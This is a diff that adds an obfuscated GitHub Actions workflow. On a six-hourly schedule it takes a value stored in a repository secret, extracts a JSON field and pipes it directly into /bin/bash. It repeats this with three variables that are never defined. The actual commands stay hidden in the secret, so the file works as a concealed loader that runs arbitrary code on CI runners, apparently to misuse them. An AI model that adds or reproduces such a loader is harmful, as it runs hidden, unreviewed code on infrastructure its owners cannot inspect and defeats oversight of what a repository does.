@@ -1,0 +1,20 @@
+name: danglangyunjiang
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '2 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: danglangyunjiang
+        env:
+          totv47786: ${{ secrets.totv47786 }}
+        run: |
+          echo $totv47786 | jq -r .nxkew5406 | /bin/bash
+          echo $u3 | jq -r .iqow62 | /bin/bash
+          echo $ml2608 | jq -r .rq679 | /bin/bash
+          echo $omstj60 | jq -r .w6281 | /bin/bash
+
